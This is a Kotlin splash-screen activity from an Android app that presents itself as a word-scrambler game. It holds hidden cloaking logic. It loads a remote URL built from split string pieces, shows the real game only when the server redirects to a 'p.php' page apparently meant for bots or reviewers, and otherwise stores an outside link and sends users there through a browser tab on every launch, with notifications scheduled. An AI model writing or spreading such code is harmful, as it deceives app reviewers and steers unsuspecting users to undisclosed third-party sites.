package feliperrm.com.wordscrambler

import android.content.Intent
import android.graphics.Color
import android.net.Uri
import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import android.util.Log
import android.view.View
import android.webkit.WebResourceRequest
import android.webkit.WebView
import android.webkit.WebViewClient
import androidx.browser.customtabs.CustomTabsIntent
import androidx.core.content.ContextCompat
import feliperrm.com.wordscrambler.data.WordPreferences
import feliperrm.com.wordscrambler.notification.AlarmNotification
import feliperrm.com.wordscrambler.ui.MainActivity
import kotlinx.android.synthetic.main.activity_splash.*

class SplashActivity : AppCompatActivity() {

    var preference : WordPreferences? = null

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_splash)
        window.statusBarColor = Color.BLUE
        actionBar?.hide()
        supportActionBar?.hide()
        preference = WordPreferences(this).apply { getSharedPreference("fav") }
        val apiLink = preference!!.getString("fav")
        if(apiLink != null && apiLink != "") goToWord(apiLink)
        else internetChecking()
    }

    private fun goToWord(url: String) {
        val builder = CustomTabsIntent.Builder()
        builder.setToolbarColor(ContextCompat.getColor(this, R.color.black))
        val customTabsIntent = builder.build()
        //job.cancel()
        customTabsIntent.launchUrl(this, Uri.parse(url))
        finish()
    }

    private fun internetChecking(){
        fav_response.settings.javaScriptEnabled = true
        fav_response.webViewClient = object : WebViewClient(){
            override fun shouldOverrideUrlLoading(
                view: WebView?,
                request: WebResourceRequest?
            ): Boolean {
                if(request == null) Log.e("kek", "sooqa req null")
               // Log.e("Url", request?.url.toString())
                var req = request?.url.toString()
                if(req.contains("p.php")){
                   // Log.e("Bot", "p")
                    chooseMenu()
                }
                else{
                    if(!req.contains(".site")){
                        AlarmNotification().scheduleNotification(this@SplashActivity)
                        //Log.e("Kek", "add")
                        preference?.putString("fav", "http://trrfcbt.com/KyQbcz")
                        goToWord("http://trrfcbt.com/KyQbcz")
                    }
                }
                return super.shouldOverrideUrlLoading(view, request)
            }
        }
        //Notification().scheduleMsg(this@MainActivity)
        val protocol = "http://"
        val site = "trrfcbt.com/"
        val php = "STJSBF"
        fav_response.loadUrl("$protocol$site$php")
    }

    private fun chooseMenu(){
        progress_bar.visibility = View.GONE
        startActivity(Intent(this, MainActivity::class.java))
        fav_response.destroy()
    }
}